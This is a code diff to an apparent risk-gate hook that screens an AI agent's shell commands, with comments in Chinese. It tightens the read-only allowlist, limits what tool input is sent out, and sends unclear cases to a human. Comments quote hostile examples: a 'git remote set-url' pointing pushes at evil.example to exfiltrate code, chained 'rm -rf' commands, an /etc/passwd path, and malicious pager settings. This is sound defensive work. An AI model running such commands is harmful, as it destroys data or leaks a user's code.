@@ -18,7 +18,9 @@ export const GATE = { riskDenyMin: 3, riskConfirmMin: 2, irreversibleMin: 0.5 };
 // SHELL_TOOL_NAMES 是**单源名单**：hooks.json 的 PreToolUse matcher 必须覆盖它的每一项。
 // 过去两处各写各的，matcher 只有 Bash|Shell|Terminal，而内核认 12 个名字——宿主把命令交给
 // cmd / exec / run / pwsh 类工具时，hook 压根不被调用，判定请求一次都不发，风险闸形同虚设。
-// 回归由 test/hook.smoke.mjs 的 matcher 同宽断言锁死（JSON 无法 import，只能在测试里对账）。
+// matcher 按「每个字母的大小写变体」书写（[Bb]ash|[Ss]hell|…）：工具名的大小写由宿主决定，
+// 插件挑不了。回归由 test/hook.smoke.mjs 的 matcher 同宽断言锁死（JSON 无法 import，
+// 只能在测试里对账）；断言刻意不带 'i' 标志——大小写不敏感地匹配会把缺小写名字的缺口掩盖掉。
 export const SHELL_TOOL_NAMES = [
   'bash', 'shell', 'terminal', 'command', 'cmd', 'exec', 'process', 'run',
   'powershell', 'pwsh', 'zsh', 'fish',
@@ -26,8 +28,45 @@ export const SHELL_TOOL_NAMES = [
 const SHELL_TOOL = new RegExp(`(^|[_\\-.])(?:${SHELL_TOOL_NAMES.join('|')})([_\\-.]|$)`, 'i');
 
 // 明显只读的命令捷径：不发判定请求直接放行（与 clarity 的寒暄捷径同一思路）
+// 注意 git branch / git remote 不在这里：它们是**命令族**而不是只读动作，见下方 gitReadonlyAllowed。
 const READONLY =
-  /^(ls|dir|pwd|cat|head|tail|grep|rg|find|which|type|echo|whoami|date|git (status|log|diff|show|branch|remote|config --get)|node -v|npm (ls|view|outdated))\b/i;
+  /^(ls|dir|pwd|cat|head|tail|grep|rg|find|which|type|echo|whoami|date|git (status|log|diff|show|config --get)|node -v|npm (ls|view|outdated))\b/i;
+
+// git branch / git remote 的只读形式必须显式列出：`git branch -D feature` 删分支、
+// `git remote remove origin` 删远端、`git remote set-url origin https://evil.example/x` 把后续
+// push 的目标指到攻击者端点（代码外泄）。首 token 白名单命中就跳过判定 = 风险闸对最该拦的
+// 一类命令完全失灵，宿主连一次提示都收不到。因此这两个命令族从通用白名单里移出，
+// 只放行「列举」类显式只读形式，其余一律发判定请求。
+const GIT_BRANCH_READONLY_FLAGS = new Set([
+  '-a', '--all', '-l', '--list', '-v', '--verbose', '-r', '--remotes', '--show-current',
+]);
+const GIT_REMOTE_READONLY_FLAGS = new Set(['-v', '--verbose']);
+const GIT_REMOTE_READONLY_SUBS = new Set(['show']);
+
+/** `git branch` / `git remote` 是否为显式只读形式（只列举，不改状态）。
+ *  位置参数（分支名/远端名）一律不算只读：`git branch feature` 是建分支。 */
+function gitReadonlyAllowed(command) {
+  const tokens = command.trim().split(/\s+/);
+  const sub = (tokens[1] || '').toLowerCase();
+  const rest = tokens.slice(2);
+  if (sub === 'branch') {
+    return rest.every((t) => GIT_BRANCH_READONLY_FLAGS.has(t.toLowerCase()));
+  }
+  if (sub === 'remote') {
+    // `git remote show [选项] <远端名>` 是只读列举：远端名是位置参数，不算副作用
+    if (rest.length > 0 && GIT_REMOTE_READONLY_SUBS.has(rest[0].toLowerCase())) {
+      const tail = rest.slice(1);
+      const positional = tail.filter((t) => !t.startsWith('-'));
+      const flags = tail.filter((t) => t.startsWith('-'));
+      return (
+        positional.length <= 1 &&
+        flags.every((t) => t === '-n' || t === '--no-query' || GIT_REMOTE_READONLY_FLAGS.has(t.toLowerCase()))
+      );
+    }
+    return rest.every((t) => GIT_REMOTE_READONLY_FLAGS.has(t.toLowerCase()));
+  }
+  return false;
+}
 
 // 链式/重定向/命令替换：出现任一符号，整条命令就不再「明显只读」。首 token 白名单再准也
 // 不作数——`echo start; rm -rf build`、`ls && rm -rf x`、`cat a > b` 都会绕过白名单直接放行。
@@ -59,11 +98,14 @@ export function riskGateEnabled(env = process.env) {
  *  已知未覆盖的窄口子（有意留着的成本权衡）：`git log/diff/show` 仍算只读，但仓库自带配置里的
  *  `core.pager` / `pager.log` / `diff.external` 是仓库可控的，恶意仓库可借此在执行 `git diff` 时
  *  跑外部程序。把它移出只读白名单会让每次 git 读取都付一次判定请求，代价远大于收益；
- *  防线交给宿主自身的目录信任与宿主权限系统，这里不再重复收费。 */
+ *  防线交给宿主自身的目录信任与宿主权限系统，这里不再重复收费。
+ *  `git branch` / `git remote` 不属此列：它们会改状态（删分支、删远端、改 push 目标），
+ *  已从通用白名单移出，只放行显式只读形式。 */
 function isReadonlyShortcut(command) {
   if (COMPOUND.test(command)) return false;
   if (PRE_EXECUTES.test(command)) return false;
   if (/^find\b/i.test(command)) return !FIND_MUTATES.test(command);
+  if (/^git (branch|remote)\b/i.test(command)) return gitReadonlyAllowed(command);
   return READONLY.test(command);
 }
 
@@ -101,22 +143,48 @@ export function applies(toolName) {
   return typeof toolName === 'string' && SHELL_TOOL.test(toolName);
 }
 
+// 退化路径：宿主用了别的字段名承载命令。原先把整个 tool_input 序列化外发，
+// 可能连带把大段文件内容、凭据片段一起送到外部端点——分析「这条命令危不危险」
+// 只需要知道有哪些字段、每个字段大概是什么，不需要全文。这里只发键名 + 截断后的值摘要。
+const FALLBACK_VALUE_CHARS = 200;
+
+function summarizeToolInput(input) {
+  const keys = Object.keys(input);
+  if (keys.length === 0) return '（工具入参为空）';
+  const parts = keys.map((key) => {
+    const value = input[key];
+    if (typeof value === 'string') {
+      const text = value.trim();
+      const clipped =
+        text.length > FALLBACK_VALUE_CHARS ? `${text.slice(0, FALLBACK_VALUE_CHARS)}…（已截断，共 ${text.length} 字符）` : text;
+      return `${key}="${clipped}"`;
+    }
+    if (value === null || typeof value !== 'object') return `${key}=${String(value)}`;
+    const size = Array.isArray(value) ? value.length : Object.keys(value).length;
+    return `${key}=<${Array.isArray(value) ? '数组' : '对象'} ${size} 项，不外发内容>`;
+  });
+  return `（工具入参无标准命令字段，仅摘要）${parts.join('；')}`;
+}
+
+// 返回 { text, standard }：standard=false 表示入参不含任何标准命令字段（只拿到字段名摘要）。
+// 调用方据此判定「模型根本没看到要执行的命令」——见 assess 里的升级逻辑。
 function commandOf(toolInput) {
   const input = toolInput && typeof toolInput === 'object' ? toolInput : {};
   const raw = input.command ?? input.cmd ?? input.script ?? input.execution_input;
-  if (typeof raw === 'string' && raw.trim() !== '') return raw.trim();
-  try {
-    return JSON.stringify(input);
-  } catch {
-    return String(input);
-  }
+  if (typeof raw === 'string' && raw.trim() !== '') return { text: raw.trim(), standard: true };
+  return { text: summarizeToolInput(input), standard: false };
 }
 
 /**
  * @param {string} toolName - 宿主传入的工具名
- * @param {unknown} toolInput - 工具入参（取 command / cmd / script 字段，退化序列化整体）
+ * @param {unknown} toolInput - 工具入参（取 command / cmd / script / execution_input 字段）。
+ *   取不到标准字段时只发字段名摘要（不外发整个入参），且因模型看不到命令内容，判定结果一律
+ *   升级为 ask 转人工——不自动放行（2026-10-28 市场审查加固）。
  * @param {Record<string, string|undefined>} [env] - 供应商配置来源，默认进程环境
- * @param {object} [opts] - { timeoutMs } 共享 deadline 的剩余预算，透传给 decide
+ * @param {object} [opts] - { timeoutMs, truncated, budgetExhausted }
+ *   timeoutMs = 共享 deadline 的剩余预算，透传给 decide；
+ *   truncated = 输入不可信（stdin 超限或预算耗尽），fail-closed 转人工；
+ *   budgetExhausted = 因耗时过久耗尽预算（只影响理由文案）
  * @returns {Promise<{decision: 'ask'|'deny', reason: string} | null>} null = 放行（不拦截）
  */
 export async function assess(toolName, toolInput, env = process.env, opts = {}) {
@@ -131,12 +199,17 @@ export async function assess(toolName, toolInput, env = process.env, opts = {}) 
   // 可以藏 `; rm -rf /`。不能走只读捷径，也不把残缺输入交给判定模型：fail-closed 转人工确认。
   //（管辖内的 shell 工具，以及 tool_name 不可读、无法排除 shell 类的情形）
   if (opts.truncated === true) {
+    // 两种「输入不可信」要分开说：stdin 超限截断 vs 读取耗时过久吃光时间预算
+    const why =
+      opts.budgetExhausted === true
+        ? 'hook 读取输入耗时过久，时间预算已耗尽'
+        : `hook 输入超过 ${STDIN_MAX_CHARS} 字符上限被截断`;
     return {
       decision: 'ask',
-      reason: `[SystemOne 风险闸] hook 输入超过 ${STDIN_MAX_CHARS} 字符上限被截断，无法完整分析命令，默认需先确认：请向用户展示命令并确认后再执行。`,
+      reason: `[SystemOne 风险闸] ${why}，无法完整分析命令，默认需先确认：请向用户展示命令并确认后再执行。`,
     };
   }
-  const command = commandOf(toolInput);
+  const { text: command, standard: standardCommand } = commandOf(toolInput);
   // 命令本身超上限同理：无法完整分析（也不把 100K+ 文本塞给判定模型白烧一次请求），fail-closed
   if (command.length > STDIN_MAX_CHARS) {
     return {
@@ -144,7 +217,9 @@ export async function assess(toolName, toolInput, env = process.env, opts = {}) 
       reason: `[SystemOne 风险闸] 命令超过 ${STDIN_MAX_CHARS} 字符上限，无法完整分析是否存在隐藏副作用，默认需先确认：请向用户展示命令并确认后再执行。`,
     };
   }
-  if (isReadonlyShortcut(command)) return null;
+  // 只读捷径只在拿到**标准命令字段**时才可信：非标准字段下 command 只是「字段名 + 截断值摘要」，
+  // 拿摘要去匹配只读前缀（如 file_path="/etc/passwd" 之类）毫无意义，且正是「模型看不到命令」的病根。
+  if (standardCommand && isReadonlyShortcut(command)) return null;
   const answers = await decide(`工具：${toolName}\n命令：${command}`, cfg, QUESTIONS, opts.timeoutMs);
   if (!answers) return null; // 无响应（网络失败/超时）：维持 fail-open 放行，与坏响应区别对待
   // 取不出 = 归一化为 null（字段缺失/题型回显错乱），或 verdict 选中判据表外的选项（幻觉）。
@@ -165,7 +240,20 @@ export async function assess(toolName, toolInput, env = process.env, opts = {}) 
   const p = irreversible.probability;
   const deny = verdict.value === 'deny' || (risk.score >= GATE.riskDenyMin && p >= GATE.irreversibleMin);
   const confirm = !deny && (verdict.value === 'confirm' || risk.score >= GATE.riskConfirmMin || p >= GATE.irreversibleMin);
-  if (!deny && !confirm) return null; // 放行，零噪音
+  // 非标准命令字段：模型收到的只是「字段名 + 截断值摘要」，看不到真正要执行的命令文本——此时模型判
+  // 「放行」不构成安全信号（它是在对摘要放行），必须升级为 ask 转人工。deny/confirm 是 fail-safe
+  // 方向，照常生效（拦截不会因看不到命令而漏）。摘要路径只发字段名、不外发整个 tool_input
+  //（见 summarizeToolInput），故不构成隐私回归。
+  if (!deny && !confirm) {
+    if (!standardCommand) {
+      return {
+        decision: 'ask',
+        reason:
+          '[SystemOne 风险闸] 宿主未用标准命令字段（command/cmd/script/execution_input）承载命令，判定模型看不到命令内容，无法自动放行：请向用户展示该命令并确认后再执行。',
+      };
+    }
+    return null; // 放行，零噪音
+  }
   const conf = [verdict.confidence, risk.confidence, irreversible.confidence].filter((c) => c !== null);
   const minConf = conf.length > 0 ? Math.min(...conf) : null;
   const lowConfident = minConf !== null && minConf < 0.7;
